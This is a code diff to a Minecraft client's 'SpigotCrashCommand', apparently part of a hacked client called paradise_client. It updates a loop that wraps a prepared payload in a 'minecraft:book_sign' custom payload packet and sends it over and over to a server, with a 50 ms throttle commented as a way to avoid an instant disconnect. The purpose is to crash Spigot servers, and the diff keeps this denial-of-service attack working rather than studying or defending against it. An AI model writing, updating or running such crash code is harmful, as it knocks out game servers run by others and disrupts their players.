@@ -9,6 +9,7 @@ import net.minecraft.client.network.ClientPlayNetworkHandler;
 import net.minecraft.client.network.ClientPlayerEntity;
 import net.minecraft.command.CommandSource;
 import net.minecraft.network.PacketByteBuf;
+import net.minecraft.network.packet.CustomPayload;
 import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
 import net.minecraft.util.Identifier;
 import net.paradise_client.Helper;
@@ -79,17 +80,23 @@ public class SpigotCrashCommand extends Command {
                         PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());
                         buf.writeBytes(payload);
 
-                        Identifier channel = Identifier.of("minecraft:book_sign");
+                        CustomPayload payloadObj = new CustomPayload() {
+                            @Override
+                            public Identifier id() {
+                                return Identifier.of("minecraft:book_sign"); // Replace with custom if needed
+                            }
 
-                        CustomPayloadC2SPacket.CustomPayload customPayload =
-                                new CustomPayloadC2SPacket.CustomPayload(channel, buf);
+                            @Override
+                            public void write(PacketByteBuf out) {
+                                out.writeBytes(buf);
+                            }
+                        };
 
-                        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(customPayload);
-
+                        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(payloadObj);
                         connection.sendPacket(packet);
                     }
 
-                    Thread.sleep(50); // throttle to reduce risk of client disconnect
+                    Thread.sleep(50); // Throttle to avoid instant disconnect
                 }
             } catch (Exception e) {
                 Helper.printChatMessage("§cCrash error: " + e.getMessage());
